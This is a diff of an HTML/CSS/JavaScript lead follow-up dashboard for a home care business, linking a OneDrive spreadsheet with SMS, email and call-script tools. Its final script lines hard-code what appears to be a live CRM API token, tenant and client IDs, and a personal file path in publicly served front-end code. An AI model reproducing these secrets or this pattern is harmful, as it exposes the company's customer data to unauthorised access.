+  display:flex;align-items:center;gap:9px;width:100%;transition:all .15s;
+}
+.pact-call{background:var(--sky-pale);color:var(--navy)}
+.pact-call:hover{background:var(--navy);color:#fff}
+.pact-sms{background:var(--grn-pale);color:var(--grn)}
+.pact-sms:hover{background:var(--grn);color:#fff}
+.pact-email{background:var(--gold-pale);color:var(--gold)}
+.pact-email:hover{background:var(--gold);color:#fff}
+.pact-script{background:#F0EFF4;color:var(--mid)}
+.pact-script:hover{background:var(--mid);color:#fff}
+
+/* Log form */
+.log-form{display:flex;flex-direction:column;gap:10px}
+.lf-field{display:flex;flex-direction:column;gap:4px}
+.lf-label{font-size:10px;font-weight:700;color:var(--soft);text-transform:uppercase;letter-spacing:.08em}
+.lf-select,.lf-input,.lf-textarea{
+  padding:8px 11px;border:1.5px solid var(--border);border-radius:8px;
+  font-family:'Plus Jakarta Sans',sans-serif;font-size:12px;
+  color:var(--dark);background:#fff;outline:none;transition:border-color .15s;
+}
+.lf-select:focus,.lf-input:focus,.lf-textarea:focus{border-color:var(--gold)}
+.lf-textarea{resize:vertical;min-height:60px;line-height:1.5}
+.lf-save{
+  width:100%;padding:9px;background:var(--gold);color:#fff;
+  border:none;border-radius:9px;font-size:13px;font-weight:700;
+  display:flex;align-items:center;justify-content:center;gap:7px;
+  transition:all .15s;
+}
+.lf-save:hover{background:var(--gold-light)}
+.lf-save:disabled{opacity:.5;cursor:not-allowed}
+.lf-spin{width:13px;height:13px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;display:none}
+.lf-spin.on{display:inline-block}
+
+/* Lead detail rows */
+.detail-row{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;font-size:12px}
+.detail-row:last-child{margin-bottom:0}
+.detail-key{color:var(--soft);flex-shrink:0;width:100px}
+.detail-val{color:var(--dark);font-weight:500;text-align:right;flex:1;word-break:break-word}
+.detail-val a{color:var(--sky)}
+.notes-box{
+  font-size:12px;color:var(--mid);line-height:1.6;
+  background:var(--gold-pale);padding:10px 13px;
+  border-radius:9px;white-space:pre-wrap;word-break:break-word;
+  border:1px solid var(--gold-mid);
+}
+.seq-log{font-size:11px;color:var(--mid);line-height:1.8}
+.seq-log-item{display:flex;align-items:flex-start;gap:7px;padding:4px 0;border-bottom:1px solid var(--border)}
+.seq-log-item:last-child{border-bottom:none}
+.seq-log-dot{width:6px;height:6px;border-radius:50%;background:var(--gold);flex-shrink:0;margin-top:5px}
+
+/* ── Modals ───────────────────────────────────────────────────────── */
+.modal-overlay{
+  display:none;position:fixed;inset:0;
+  background:rgba(0,0,0,.5);z-index:500;
+  align-items:center;justify-content:center;padding:20px;
+}
+.modal-overlay.open{display:flex}
+.modal-box{
+  background:var(--warm);border-radius:20px;
+  max-height:90vh;overflow-y:auto;
+  box-shadow:0 20px 60px rgba(0,0,0,.3);width:100%;
+}
+.modal-hdr{
+  background:var(--navy);padding:18px 24px;
+  border-radius:20px 20px 0 0;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.modal-title{font-family:'Cormorant Garamond',serif;font-size:19px;font-weight:500;color:var(--gold-light)}
+.modal-x{background:rgba(255,255,255,.12);border:none;color:var(--gold-light);width:28px;height:28px;border-radius:7px;font-size:16px;display:flex;align-items:center;justify-content:center}
+.modal-x:hover{background:var(--gold);color:#fff}
+.modal-body{padding:22px 24px}
+.m-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--soft);margin-bottom:4px}
+.m-val-box{font-size:13px;color:var(--mid);padding:8px 12px;background:var(--cream);border-radius:8px;margin-bottom:14px}
+.m-input{
+  width:100%;padding:9px 12px;
+  border:1.5px solid var(--border);border-radius:8px;
+  font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;
+  outline:none;background:#fff;color:var(--dark);
+  transition:border-color .15s;margin-bottom:14px;
+}
+.m-input:focus{border-color:var(--gold)}
+.m-textarea{
+  width:100%;padding:9px 12px;
+  border:1.5px solid var(--border);border-radius:8px;
+  font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;
+  outline:none;background:#fff;color:var(--dark);
+  min-height:140px;resize:vertical;margin-bottom:18px;
+  transition:border-color .15s;line-height:1.6;
+}
+.m-textarea:focus{border-color:var(--gold)}
+.m-acts{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.m-send{padding:9px 22px;background:var(--gold);color:#fff;border:none;border-radius:9px;font-size:13px;font-weight:700}
+.m-send:hover{background:var(--gold-light)}
+.m-send:disabled{opacity:.5;cursor:not-allowed}
+.m-send-grn{background:var(--grn)}
+.m-send-grn:hover{background:#1B5E20}
+.m-hcg{
+  padding:9px 16px;background:var(--sky-pale);color:var(--navy-mid);
+  border:1px solid var(--sky-mid);border-radius:9px;font-size:13px;font-weight:600;
+}
+.m-cancel{padding:9px 16px;background:none;color:var(--soft);border:1.5px solid var(--border);border-radius:9px;font-size:13px}
+.m-sending{font-size:12px;color:var(--soft);display:none;align-items:center;gap:6px}
+.m-sending.on{display:flex}
+.m-spin{width:13px;height:13px;border:2px solid var(--border);border-top-color:var(--gold);border-radius:50%;animation:spin .7s linear infinite}
+/* Script modal */
+.script-box{padding:20px 24px}
+.script-phase{
+  display:inline-block;font-size:11px;font-weight:700;padding:3px 12px;
+  border-radius:20px;background:var(--gold-pale);color:var(--gold);
+  border:1px solid var(--gold-mid);margin-bottom:14px;
+}
+.script-section{margin-bottom:18px}
+.script-section-t{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--soft);margin-bottom:6px}
+.script-content{
+  background:var(--cream);border-radius:10px;padding:13px 16px;
+  font-size:13px;color:var(--dark);line-height:1.7;
+  border:1px solid var(--border);white-space:pre-wrap;
+}
+.script-tip{
+  background:var(--sky-pale);border-radius:10px;padding:11px 14px;
+  font-size:12px;color:var(--navy-mid);margin-top:10px;
+  border:1px solid var(--sky-mid);
+}
+
+/* ── Toast ────────────────────────────────────────────────────────── */
+.toast{
+  position:fixed;bottom:24px;right:24px;
+  background:var(--dark);color:#fff;
+  padding:11px 18px;border-radius:11px;
+  font-size:13px;font-weight:500;
+  box-shadow:0 8px 28px rgba(0,0,0,.25);
+  transform:translateY(80px);opacity:0;
+  transition:all .35s cubic-bezier(.34,1.56,.64,1);
+  z-index:999;border-left:3px solid var(--gold);max-width:320px;
+}
 .toast.show{transform:translateY(0);opacity:1}
 
-/* Spinner / Error */
-.spinner{display:none;align-items:center;justify-content:center;padding:80px;gap:14px;font-size:14px;color:var(--soft);position:relative;z-index:1}
-.spinner.on{display:flex}
-.bspin{width:28px;height:28px;border:3px solid var(--border);border-top-color:var(--gold);border-radius:50%;animation:spin .8s linear infinite}
-.ebar{display:none;margin:12px 36px;padding:13px 18px;background:var(--red-pale);border:1px solid var(--red-mid);border-radius:12px;font-size:13px;color:var(--red);position:relative;z-index:1}
-.ebar.on{display:block}
-</style>
-<style type="text/css" nonce="">.redacted {
-  color: red !important;
-}
-/* ── Mobile PWA layout ─────────────────────────────────────────────── */
-@media(max-width:700px){
-  body{padding-bottom:60px}
-  body::before{background-size:20px 20px}
-
-  /* Header */
-  .hdr{height:56px;padding:0 16px}
-  .logo-wrap{width:38px;height:38px}
-  .brand{font-size:18px}
+/* ── Mobile ───────────────────────────────────────────────────────── */
+@media(max-width:768px){
+  body{padding-bottom:62px}
+  .hdr{height:52px;padding:0 16px}
+  .logo-wrap{width:34px;height:34px}
+  .brand{font-size:17px}
   .sync-pill{display:none}
-  .hbtn{font-size:11px;padding:6px 11px}
+  .hbtn{font-size:11px;padding:5px 12px}
+  :root{--hdr-h:52px}
 
-  /* KPI bar — single compact row */
-  .kbar{grid-template-columns:repeat(4,1fr)!important;height:auto}
-  .kpi{padding:6px 4px;text-align:center;border-right:.5px solid var(--border)}
-  .kpi:last-child{border-right:none}
-  .kval{font-size:22px}
-  .klbl{font-size:8px;letter-spacing:.04em}
-  .ksub{display:none}
-  .kbb{height:2px}
+  .kbar{grid-template-columns:repeat(4,1fr)!important}
+  .kpi{padding:8px 6px;text-align:center}
+  .k-val{font-size:24px}
+  .k-lbl{font-size:8px}
+  .k-sub{display:none}
 
-  /* Main content area */
   .main{padding:14px 12px}
-  .tbar{margin-bottom:14px}
-  .fpill{font-size:11px;padding:5px 10px}
-  .lref{font-size:10px}
+  .data-bar{margin-bottom:12px}
 
-  /* Section headers */
-  .stitle{font-size:17px}
-  .shdr{margin-bottom:8px}
-
-  /* ── Table → Card layout ── */
-  .tc{background:transparent;border:none;box-shadow:none;border-radius:0}
-  table,thead,tbody,tr,td,th{display:block;width:100%}
-  thead{display:none}
-
-  tbody tr.dr{
-    background:var(--warm);
-    border:1px solid var(--border);
-    border-radius:14px;
-    margin-bottom:10px;
-    padding:12px 14px;
-    border-bottom:1px solid var(--border)!important;
-    border-left:none!important;
-    position:relative;
-    box-shadow:0 1px 8px rgba(0,0,0,.05);
+  .panel{
+    width:100%;top:auto;bottom:0;
+    height:88vh;border-radius:22px 22px 0 0;
+    border-left:none;border-top:1px solid var(--border);
   }
-  tbody tr.dr.sel{border-left:3px solid var(--gold)!important;padding-left:11px}
-  tbody tr.dr:last-child{border-bottom:1px solid var(--border)!important}
+  .page.panel-open{padding-right:0}
 
-  /* Card layout: name+contact fill top row, badge top-right */
-  tbody td{padding:0;border:none}
-  /* name col */
-  tbody td:nth-child(1){margin-bottom:6px}
-  .tn{font-size:15px;padding-right:70px}
-  .ts{font-size:11px}
-  /* contact links */
-  tbody td:nth-child(2){margin-bottom:8px}
-  .tc2 a{font-size:12px;display:inline-block;margin-right:10px}
-  /* status badge — float top-right */
-  tbody td:nth-child(3){position:absolute;top:12px;right:12px}
-  /* follow-up pill */
-  tbody td:nth-child(4){margin-bottom:6px}
-  .pill{font-size:11px}
-  /* sequence */
-  tbody td:nth-child(5){margin-bottom:8px}
-  .spill{font-size:9px;padding:2px 7px}
-  .snxt{font-size:11px}
-  /* action buttons col */
-  tbody td:nth-child(6) .rbtns{flex-direction:column;min-width:0;width:100%}
+  .modal-box{max-width:100%;margin:auto 0 0;border-radius:22px 22px 0 0}
+  .modal-overlay{align-items:flex-end;padding:0}
+  .modal-hdr{border-radius:22px 22px 0 0}
 
-  /* Expand panel */
-  .ep .epi{padding:14px 16px}
-  .egrid.g4{grid-template-columns:1fr 1fr}
-  .egrid.g3{grid-template-columns:1fr 1fr}
-  .egrid.g2{grid-template-columns:1fr 1fr}
-
-  /* Drawer becomes full-screen sheet */
-  .drawer{width:100%;top:auto;bottom:0;height:85vh;border-radius:20px 20px 0 0;border-left:none;border-top:1px solid var(--border)}
-  .pw.do{padding-right:0}
-
-  /* Modals full-width */
-  #script-modal>div,#email-modal>div,#sms-modal>div{max-width:100%;margin:auto 0 0;border-radius:20px 20px 0 0}
-  #script-modal,#email-modal,#sms-modal{align-items:flex-end;padding:0}
-
-  /* Bottom tab bar */
   .mob-tabs{display:flex!important}
-
-  /* Push content above tab bar */
-  .pw{padding-bottom:0}
-  .ebar{margin:8px 12px}
-  .spinner{padding:40px}
 }
 
-/* Bottom tab bar — hidden on desktop, shown on mobile */
+/* ── Bottom Tab Bar ───────────────────────────────────────────────── */
 .mob-tabs{
-  display:none;
-  position:fixed;
-  bottom:0;left:0;right:0;
-  height:56px;
-  background:var(--warm);
-  border-top:1px solid var(--border);
-  z-index:300;
+  display:none;position:fixed;bottom:0;left:0;right:0;
+  height:58px;background:var(--warm);border-top:1px solid var(--border);
+  z-index:300;box-shadow:0 -2px 12px rgba(0,0,0,.07);
   padding-bottom:env(safe-area-inset-bottom);
-  box-shadow:0 -2px 12px rgba(0,0,0,.08);
 }
 .mob-tab{
   flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
-  gap:3px;cursor:pointer;color:var(--soft);font-size:9px;font-weight:600;
-  text-transform:uppercase;letter-spacing:.04em;
+  gap:3px;color:var(--soft);font-size:9px;font-weight:700;
+  text-transform:uppercase;letter-spacing:.05em;
   border:none;background:none;padding:0;
+  transition:color .15s;
 }
-.mob-tab.on{color:var(--sky-deep)}
-.mob-tab svg{width:22px;height:22px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
-</style></head>
+.mob-tab svg{width:21px;height:21px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+.mob-tab.on{color:var(--navy)}
+</style>
+</head>
 <body>
 
+<!-- ── Header ──────────────────────────────────────────────────────── -->
 <div class="hdr">
   <div class="hdr-l">
     <div class="logo-wrap">
-      <img src="https://aronsolurahomecarecom.github.io/solura-dashboard/logo.png" alt="S" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
+      <img src="https://aronsolurahomecarecom.github.io/solura-dashboard/logo.png" alt="S"
+           onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
       <span class="logo-s" style="display:none">S</span>
     </div>
     <div class="brand">Solura Home Care</div>
   </div>
   <div class="hdr-r">
-    <div class="sync-pill"><div class="sdot" id="sdot"></div><span id="slabel">Not connected</span></div>
+    <div class="sync-pill">
+      <div class="s-dot" id="sdot"></div>
+      <span id="slabel">Not connected</span>
+    </div>
     <button class="hbtn hbtn-gold" id="btn-refresh" onclick="loadData()" style="display:none">↻ Refresh</button>
     <button class="hbtn hbtn-ghost" id="btn-out" onclick="signOut()" style="display:none">Sign out</button>
   </div>
 </div>
 
-<div class="ebar" id="err"></div>
-
+<!-- ── KPI Bar ──────────────────────────────────────────────────────── -->
 <div class="kbar" id="kbar">
-  <div class="kpi kr"><div class="klbl">Overdue</div><div class="kval" id="kv0">0</div><div class="ksub">contact immediately</div><div class="kbb"></div></div>
-  <div class="kpi kg"><div class="klbl">Due Today</div><div class="kval" id="kv1">0</div><div class="ksub">follow up now</div><div class="kbb"></div></div>
-  <div class="kpi kgr"><div class="klbl">This Week</div><div class="kval" id="kv2">0</div><div class="ksub">coming up soon</div><div class="kbb"></div></div>
-  <div class="kpi ks"><div class="klbl">Active Leads</div><div class="kval" id="kv3">0</div><div class="ksub">in pipeline</div><div class="kbb"></div></div>
+  <div class="kpi kpi-r">
+    <div class="k-lbl">Overdue</div>
+    <div class="k-val" id="kv0">0</div>
+    <div class="k-sub" id="ks0">contact immediately</div>
+    <div class="k-bar"></div>
+  </div>
+  <div class="kpi kpi-a">
+    <div class="k-lbl">Due Today</div>
+    <div class="k-val" id="kv1">0</div>
+    <div class="k-sub" id="ks1">follow up now</div>
+    <div class="k-bar"></div>
+  </div>
+  <div class="kpi kpi-g">
+    <div class="k-lbl">This Week</div>
+    <div class="k-val" id="kv2">0</div>
+    <div class="k-sub" id="ks2">coming up</div>
+    <div class="k-bar"></div>
+  </div>
+  <div class="kpi kpi-b">
+    <div class="k-lbl">Active Leads</div>
+    <div class="k-val" id="kv3">0</div>
+    <div class="k-sub" id="ks3">in pipeline</div>
+    <div class="k-bar"></div>
+  </div>
 </div>
 
-<div id="ls">
-  <div class="lcard">
-    <div class="llogo">
-      <img src="https://aronsolurahomecarecom.github.io/solura-dashboard/logo.png" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
-      <span class="llogo-s" style="display:none">S</span>
+<!-- ── Login ────────────────────────────────────────────────────────── -->
+<div id="login-screen">
+  <div class="login-card">
+    <div class="login-logo">
+      <img src="https://aronsolurahomecarecom.github.io/solura-dashboard/logo.png" alt=""
+           onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
+      <span class="login-logo-s" style="display:none">S</span>
     </div>
-    <div class="ltitle">Follow-Up Dashboard</div>
-    <div class="lsub">Sign in with Microsoft to connect live to your <strong>Solura_Lead_Tracker.xlsx</strong> on OneDrive.</div>
-    <label class="flabel">Azure Client ID</label>
-    <div class="frow"><input type="text" id="cid" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"></div>
-    <button class="msbtn" onclick="signIn()">
-      <svg width="18" height="18" viewbox="0 0 21 21"><rect x="1" y="1" width="9" height="9" fill="#f25022"></rect><rect x="11" y="1" width="9" height="9" fill="#7fba00"></rect><rect x="1" y="11" width="9" height="9" fill="#00a4ef"></rect><rect x="11" y="11" width="9" height="9" fill="#ffb900"></rect></svg>
+    <div class="login-title">Follow-Up Dashboard</div>
+    <div class="login-sub">Sign in with Microsoft to connect live to your <strong>Solura_Lead_Tracker.xlsx</strong> on OneDrive.</div>
+    <label class="f-label">Azure Client ID</label>
+    <input class="f-input" type="text" id="cid" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx">
+    <button class="login-btn" onclick="signIn()">
+      <svg width="18" height="18" viewBox="0 0 21 21"><rect x="1" y="1" width="9" height="9" fill="#f25022"/><rect x="11" y="1" width="9" height="9" fill="#7fba00"/><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg>
       Sign in with Microsoft
     </button>
-    <div class="lnote">Client ID: <strong>1cb530f8-6c5f-4605-9590-068dd55e0b81</strong></div>
+    <div class="login-note">Client ID: <strong>1cb530f8-6c5f-4605-9590-068dd55e0b81</strong></div>
   </div>
 </div>
 
-<div class="spinner" id="spinner"><div class="bspin"></div><span id="smsg">Loading…</span></div>
+<!-- ── Spinner / Error ──────────────────────────────────────────────── -->
+<div class="spinner" id="spinner"><div class="spin-ring"></div><span id="smsg">Loading…</span></div>
+<div class="error-bar" id="err"></div>
 
-<div class="drawer" id="drawer">
-  <div class="dhb">
-    <div class="dname" id="dname">—</div>
-    <div id="dstatus"></div>
-    <button class="dclose" onclick="closeDrawer()">✕</button>
-  </div>
-  <div class="dbody" id="dbody"></div>
-</div>
+<!-- ── Page Layout ──────────────────────────────────────────────────── -->
+<div class="page" id="page">
 
-<div class="pw" id="pw">
-<div class="main" id="main">
-  <div class="tbar">
-    <div class="fpill"><span class="fdot"></span>Solura_Lead_Tracker.xlsx — OneDrive</div>
-    <div class="lref" id="lref"></div>
-  </div>
-  <div class="sw sr"><div class="shdr"><div class="sdot2"></div><div class="stitle">Overdue — Contact First</div><div class="scnt" id="c0">0 leads</div></div><div class="tc" id="t0"></div></div>
-  <div class="sw sa"><div class="shdr"><div class="sdot2"></div><div class="stitle">Due Today</div><div class="scnt" id="c1">0 leads</div></div><div class="tc" id="t1"></div></div>
-  <div class="sw sg"><div class="shdr"><div class="sdot2"></div><div class="stitle">Due This Week</div><div class="scnt" id="c2">0 leads</div></div><div class="tc" id="t2"></div></div>
-  <div class="sw" style="margin-top:8px"><div class="shdr" style="border-bottom:2px solid var(--border)"><div class="sdot2" style="background:var(--soft)"></div><div class="stitle" style="color:var(--mid)">All Active Leads</div><div class="scnt" id="c3" style="background:#F0EFF4;color:#6B6980;border:1px solid #DDDDE8">0 leads</div></div><div class="tc" id="t3"></div></div>
-</div>
-</div>
-
-<div id="script-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:500;align-items:center;justify-content:center;padding:20px">
-  <div style="background:var(--warm);border-radius:20px;max-width:620px;width:100%;max-height:88vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,.3)">
-    <div style="background:var(--sky-deep);padding:20px 24px;border-radius:20px 20px 0 0;display:flex;align-items:center;justify-content:space-between">
-      <div style="font-family:'Cormorant Garamond',serif;font-size:20px;font-weight:500;color:var(--gold)" id="script-title">Call Script</div>
-      <button onclick="closeModal('script-modal')" style="background:rgba(255,255,255,.15);border:none;color:var(--gold);width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px">✕</button>
+  <!-- Main content -->
+  <div class="main" id="main">
+    <div class="data-bar">
+      <div class="data-pill"><span class="data-dot"></span>Solura_Lead_Tracker.xlsx — OneDrive</div>
+      <div class="data-ref" id="data-ref"></div>
     </div>
-    <div id="script-body" style="padding:20px 24px"></div>
-  </div>
-</div>
-<div id="email-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:500;align-items:center;justify-content:center;padding:20px">
-  <div style="background:var(--warm);border-radius:20px;max-width:580px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3)">
-    <div style="background:var(--sky-deep);padding:18px 24px;border-radius:20px 20px 0 0;display:flex;align-items:center;justify-content:space-between">
-      <div style="font-family:'Cormorant Garamond',serif;font-size:18px;color:var(--gold)">Send Email</div>
-      <button onclick="closeModal('email-modal')" style="background:rgba(255,255,255,.15);border:none;color:var(--gold);width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px">✕</button>
+    <!-- Overdue -->
+    <div class="section section-od" id="sec-od">
+      <div class="section-hdr">
+        <div class="sec-dot"></div>
+        <div class="sec-title">Overdue — Contact First</div>
+        <div class="sec-count" id="c-od">0 leads</div>
+      </div>
+      <div id="t-od"></div>
     </div>
-    <div style="padding:20px 24px">
-      <div style="font-size:11px;font-weight:700;text-transform:uppercase;color:var(--soft);margin-bottom:4px">To</div>
-      <div id="email-to" style="font-size:13px;color:var(--mid);margin-bottom:12px;padding:8px 12px;background:var(--cream);border-radius:8px"></div>
-      <div style="font-size:11px;font-weight:700;text-transform:uppercase;color:var(--soft);margin-bottom:4px">Subject</div>
-      <input id="email-subject" type="text" style="width:100%;padding:9px 12px;border:1.5px solid var(--border);border-radius:8px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;outline:none;margin-bottom:12px">
-      <div style="font-size:11px;font-weight:700;text-transform:uppercase;color:var(--soft);margin-bottom:4px">Message</div>
-      <textarea id="email-body" style="width:100%;padding:9px 12px;border:1.5px solid var(--border);border-radius:8px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;outline:none;min-height:160px;resize:vertical;margin-bottom:16px"></textarea>
-      <div style="display:flex;gap:8px;align-items:center">
-        <button id="email-send-btn" onclick="sendEmailNow()" style="padding:9px 20px;background:var(--gold);color:#fff;border:none;border-radius:9px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;font-weight:700;cursor:pointer">Send via Outlook</button>
-        <button onclick="closeModal('email-modal')" style="padding:9px 16px;background:none;color:var(--soft);border:1.5px solid var(--border);border-radius:9px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;cursor:pointer">Cancel</button>
-        <div id="email-sending" style="font-size:12px;color:var(--soft);display:none;align-items:center;gap:6px"><div class="mspin"></div> Sending...</div>
+    <!-- Today -->
+    <div class="section section-td" id="sec-td">
+      <div class="section-hdr">
+        <div class="sec-dot"></div>
+        <div class="sec-title">Due Today</div>
+        <div class="sec-count" id="c-td">0 leads</div>
+      </div>
+      <div id="t-td"></div>
+    </div>
+    <!-- This week -->
+    <div class="section section-wk" id="sec-wk">
+      <div class="section-hdr">
+        <div class="sec-dot"></div>
+        <div class="sec-title">Due This Week</div>
+        <div class="sec-count" id="c-wk">0 leads</div>
+      </div>
+      <div id="t-wk"></div>
+    </div>
+    <!-- All active -->
+    <div class="section section-all" id="sec-all" style="margin-top:8px">
+      <div class="section-hdr">
+        <div class="sec-dot"></div>
+        <div class="sec-title">All Active Leads</div>
+        <div class="sec-count" id="c-all">0 leads</div>
+      </div>
+      <div id="t-all"></div>
+    </div>
+  </div>
+
+  <!-- Detail Panel -->
+  <div class="panel" id="panel">
+    <div class="panel-hdr">
+      <div class="panel-name" id="panel-name">—</div>
+      <div class="panel-meta" id="panel-meta"></div>
+      <button class="panel-close" onclick="closePanel()">✕</button>
+    </div>
+    <div class="panel-body" id="panel-body"></div>
+  </div>
+
+</div>
+
+<!-- ── SMS Modal ────────────────────────────────────────────────────── -->
+<div class="modal-overlay" id="sms-modal">
+  <div class="modal-box" style="max-width:500px">
+    <div class="modal-hdr">
+      <div class="modal-title">Send SMS</div>
+      <button class="modal-x" onclick="closeModal('sms-modal')">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="m-label">To</div>
+      <div class="m-val-box" id="sms-to"></div>
+      <div class="m-label">Message</div>
+      <textarea class="m-textarea" id="sms-body" style="min-height:110px"></textarea>
+      <div class="m-acts">
+        <button class="m-send m-send-grn" id="sms-send-btn" onclick="sendSMSNow()">Send SMS</button>
+        <a class="m-hcg" id="sms-hcg-link" href="#" target="_blank">Open in HCG</a>
+        <button class="m-cancel" onclick="closeModal('sms-modal')">Cancel</button>
+        <div class="m-sending" id="sms-sending"><div class="m-spin"></div> Sending…</div>
       </div>
     </div>
   </div>
 </div>
-<div id="sms-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:500;align-items:center;justify-content:center;padding:20px">
-  <div style="background:var(--warm);border-radius:20px;max-width:500px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3)">
-    <div style="background:var(--sky-deep);padding:18px 24px;border-radius:20px 20px 0 0;display:flex;align-items:center;justify-content:space-between">
-      <div style="font-family:'Cormorant Garamond',serif;font-size:18px;color:var(--gold)">Send SMS</div>
-      <button onclick="closeModal('sms-modal')" style="background:rgba(255,255,255,.15);border:none;color:var(--gold);width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px">✕</button>
+
+<!-- ── Email Modal ──────────────────────────────────────────────────── -->
+<div class="modal-overlay" id="email-modal">
+  <div class="modal-box" style="max-width:580px">
+    <div class="modal-hdr">
+      <div class="modal-title">Send Email</div>
+      <button class="modal-x" onclick="closeModal('email-modal')">✕</button>
     </div>
-    <div style="padding:20px 24px">
-      <div style="font-size:12px;color:var(--soft);margin-bottom:12px">Review the message then send directly via HomeCareGrow:</div>
-      <textarea id="sms-preview" style="width:100%;padding:12px 14px;border:1.5px solid var(--sky-mid);border-radius:12px;font-size:13px;color:var(--dark);line-height:1.6;margin-bottom:16px;min-height:100px;resize:vertical;background:var(--sky-pale);font-family:'Plus Jakarta Sans',sans-serif;outline:none"></textarea>
-      <div style="display:flex;gap:8px;align-items:center">
-        <button id="sms-send-btn" onclick="sendSMSNow()" style="padding:9px 20px;background:var(--grn);color:#fff;border:none;border-radius:9px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;font-weight:700;cursor:pointer">Send SMS Now</button>
-        <a id="sms-hcg-link" href="#" target="_blank" style="padding:9px 16px;background:var(--sky-pale);color:var(--sky-deep);border:1px solid var(--sky-mid);border-radius:9px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;font-weight:600;text-decoration:none;display:inline-block">Open in HCG</a>
-        <button onclick="closeModal('sms-modal')" style="padding:9px 14px;background:none;color:var(--soft);border:1.5px solid var(--border);border-radius:9px;font-family:'Plus Jakarta Sans',sans-serif;font-size:13px;cursor:pointer">Cancel</button>
-        <div id="sms-sending" style="font-size:12px;color:var(--soft);display:none;align-items:center;gap:6px"><div class="mspin"></div> Sending...</div>
+    <div class="modal-body">
+      <div class="m-label">To</div>
+      <div class="m-val-box" id="email-to"></div>
+      <div class="m-label">Subject</div>
+      <input class="m-input" type="text" id="email-subject">
+      <div class="m-label">Message</div>
+      <textarea class="m-textarea" id="email-body"></textarea>
+      <div class="m-acts">
+        <button class="m-send" id="email-send-btn" onclick="sendEmailNow()">Send via Outlook</button>
+        <button class="m-cancel" onclick="closeModal('email-modal')">Cancel</button>
+        <div class="m-sending" id="email-sending"><div class="m-spin"></div> Sending…</div>
       </div>
     </div>
   </div>
 </div>
+
+<!-- ── Script Modal ─────────────────────────────────────────────────── -->
+<div class="modal-overlay" id="script-modal">
+  <div class="modal-box" style="max-width:620px">
+    <div class="modal-hdr">
+      <div class="modal-title" id="script-title">Call Script</div>
+      <button class="modal-x" onclick="closeModal('script-modal')">✕</button>
+    </div>
+    <div class="script-box" id="script-body"></div>
+  </div>
+</div>
+
+<!-- ── Toast ────────────────────────────────────────────────────────── -->
 <div class="toast" id="toast"></div>
 
+<!-- ── Mobile Tab Bar ───────────────────────────────────────────────── -->
+<nav class="mob-tabs" id="mob-tabs">
+  <button class="mob-tab on" id="tab-queue" onclick="mobTab('queue')">
+    <svg viewBox="0 0 24 24"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2"/><rect x="9" y="3" width="6" height="4" rx="2"/><line x1="9" y1="12" x2="15" y2="12"/><line x1="9" y1="16" x2="13" y2="16"/></svg>
+    Queue
+  </button>
+  <button class="mob-tab" id="tab-all" onclick="mobTab('all')">
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+    All Leads
+  </button>
+  <button class="mob-tab" id="tab-sync" onclick="loadData()">
+    <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><polyline points="23 20 23 14 17 14"/><path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4-4.64 4.36A9 9 0 0 1 3.51 15"/></svg>
+    Sync
+  </button>
+</nav>
+
+<!-- ── JavaScript ───────────────────────────────────────────────────── -->
 <script>
-var FN='Solura_Lead_Tracker.xlsx';
-var GHL_LOC='kWlzzI2WZaes2GnQf7DV';
-var GHL_KEY='pit-5df912ec-7542-4dc8-af5b-272472ba84e9';
-var GHL_BASE='https://services.leadconnectorhq.com';
-var GR='https://graph.microsoft.com/v1.0',
-    TN='1b2cdbea-de19-47d2-9512-ea102905e3eb',
-    RD='https://aronsolurahomecarecom.github.io/solura-dashboard/Solura_Dashboard.html',
-    SC='Files.ReadWrite.All Sites.ReadWrite.All User.Read offline_access',
-    SP='/personal/aron_solurahomecare_com/Documents/Solura_Lead_Tracker.xlsx';
